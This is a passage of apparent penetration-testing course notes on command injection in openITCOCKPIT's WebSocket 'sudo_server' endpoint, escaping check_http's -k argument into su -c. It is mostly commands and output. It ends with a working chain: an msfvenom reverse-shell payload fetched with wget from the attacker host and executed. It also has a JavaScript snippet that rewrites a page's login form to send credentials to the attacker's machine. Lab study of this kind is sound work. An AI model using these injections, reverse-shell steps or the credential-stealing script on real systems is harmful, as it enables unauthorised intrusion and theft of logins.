;system('{cmd}')
Listing 69 - Downloading the FuzzDB list of commands

The list uses a template where the {cmd} variable can be replaced. By looping through each of these injection templates, sending it to the server, and inspecting the response, we can discover if any of the techniques allows for us to inject into the template.

1
(Adam Muntner, 2020), https://github.com/fuzzdb-project/fuzzdb ↩︎

##### Digging Deeper
At this point, we should have determined that none of the command injection techniques worked. Now we have to Try Harder. While we cannot inject into a new command, some commands might allow us to inject into the arguments. For example, the find command accepts the -exec argument, which executes a command on each file found.

Unfortunately, at this point we only know that the ls command works and it does not accept any arguments that allow for arbitrary command execution. But let's inspect the output of ls a bit more carefully.

The output displays a list of scripts, and after some trial and error, we discover that we can run those scripts.

kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
ls
...
check_hpjd
check_http
check_icmp
...
./check_http
check_http: Could not parse arguments
Usage:
 check_http -H <vhost> | -I <IP-address> [-u <uri>] [-p <port>]
       [-J <client certificate file>] [-K <private key>]
       [-w <warn time>] [-c <critical time>] [-t <timeout>] [-L] [-E] [-a auth]
       [-b proxy_auth] [-f <ok|warning|critcal|follow|sticky|stickyport>]
       [-e <expect>] [-d string] [-s string] [-l] [-r <regex> | -R <case-insensitive regex>]
       [-P string] [-m <min_pg_size>:<max_pg_size>] [-4|-6] [-N] [-M <age>]
       [-A string] [-k string] [-S <version>] [--sni] [-C <warn_age>[,<crit_age>]]
       [-T <content-type>] [-j method]
Listing 70 - Trying check_http

After reviewing the output of all the commands in the current directory, we don't find any argument that allows for direct command execution. However, the check_http command is particularly interesting. Reviewing the usage instructions for check_http in Listing 70 reveals that it allows us to inject custom headers with the -k argument. The ability to inject custom headers into a request is useful as it might provide us a blank slate to interact with local services that are not HTTP-based. This is only possible if we can set the IP address of the command to 127.0.0.1, can set the port to any value, and can set the header to any value we want. To find if we have this level of control, let's first start a Netcat listener on Kali.

kali@kali:~$ nc -nvlp 8080
listening on [any] 8080 ...
Listing 71 - Starting Netcat listener

Now we'll have openITCOCKPIT connect back to us using the check_http command so that we can review the data it sends.

kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
./check_http -I 192.168.119.120 -p 8080
CRITICAL - Socket timeout after 10 seconds
Listing 72 - Connecting back to Kali

The listener displays the data that was received from the connection:

listening on [any] 8080 ...
connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34448
GET / HTTP/1.0
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
Listing 73 - Initial HTTP connection

Now, we will run the same check_http connection but add a header with the -k argument. For now, we'll send just a string, "string1".

kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
./check_http -I 192.168.119.120 -p 8080 -k string1
CRITICAL - Socket timeout after 10 seconds
Listing 74 - Connecting to Kali with header

Returning to our listener, we find that the header was added.

kali@kali:~$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34508
GET / HTTP/1.0
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
string1
Listing 75 - Connection with header

Next, we'll make the header longer, sending the argument -k "string1 string2" (including the double quotes) and check our listener:

kali@kali:~$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34552
GET / HTTP/1.1
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
Host: string2":8080
"string1
Listing 76 - Interesting connection back with double quote

We notice that the first quote is escaped and sent and the second part of the header is included in the Host header. That is not what we were expecting. Now let's try using a single quote (making the argument -k 'string1 string2').

kali@kali:~$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34578
GET / HTTP/1.0
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
string1
Listing 77 - Viewing connection back with single quote

Sending a single quote returned just a single "string1" header but without any quotes.

To recap, sending a string with double quotes escapes the double quote and the value after the space is treated as a parameter to the Host header. When we send a single quote, the quote is not escaped and the second string is not included at all. An inconsistency of this type generally suggests that we are injecting an unexpected character. If that is the case, when using a single quote we might be injecting "string2" as another command.

To test this theory, we will replace "string2" with "--help". If we get the help message of check_http, we know that we are not injecting into another command and that we have instead discovered a strange bug. However, if we receive no help message or a help message from a different command, we know that we might have discovered an escape.

kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
./check_http -I 192.168.119.120 -p 8080 -k 'string1 --help'     
Usage: su [options] [LOGIN]

Options:
  -c, --command COMMAND         pass COMMAND to the invoked shell
  -h, --help                    display this help message and exit
  -, -l, --login                make the shell a login shell
  -m, -p,
  --preserve-environment        do not reset environment variables, and
                                keep the same shell
  -s, --shell SHELL             use SHELL instead of the default in passwd
Listing 78 - Injecting help argument

The output reveals the help output from the su command. Excellent!

Let's pause here and try to analyze what might be going on. The WebSocket connection takes input that is expected to be executed. However, the developers did not want to allow users to run arbitrary commands. Instead, they whitelisted only certain commands (the ls command and the commands in the current directory). Given the output when we appended "--help", we can also assume that they wanted to run the commands as a certain user, so they used su to accomplish that. We can speculate that the command looks something like this:

su someuser -c './check_http -I 192.168.119.120 -p 8080 -k 'test --help''
Listing 79 - Command speculation

Given that a single quote allows us to escape the command the developers expected us to run, we can reasonably assume a single quote is what encapsulates the user-provided data. We can also reasonably assume that this data is passed into the -c (short for "command") flag in su, which will be executed by the username provided to su. By appending a single quote, we can escape the encapsulation and directly inject into the su command.

Since we suspect that the developers are using -c to pass in the command we are attempting to run, what will happen if we pass in another -c?

kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
./check_http -I 192.168.119.120 -p 8080 -k 'test -c 'echo 'hacked'
hacked
Listing 80 - Injecting echo command

In this output, the second -c argument was executed instead of the first. We can now run any command we desire. In order to simplify exploitation, we can make modifications to our client script to run code and bypass the filters.


shell:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST="192.168.45.204" LPORT=8888 -f elf > shell.elf
python3 -m http.server
./check_http -I 192.168.45.204 -p 8888 -k 'test -c 'wget http://192.168.45.204:8000/shell.elf -O /tmp/shell.elf
./check_http -I 192.168.45.204 -p 8888 -k 'test -c 'chmod +x /tmp/shell.elf
nc -nvlp 8888
./check_http -I 192.168.45.204 -p 8888 -k 'test -c '/tmp/shell.elf


```



Some example of login page from mentor:

```
fetch("https://openitcockpit/login/login.html").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://kali_IP"
	document.getElementsByTagName("form")[0].method = "get"
}))
```
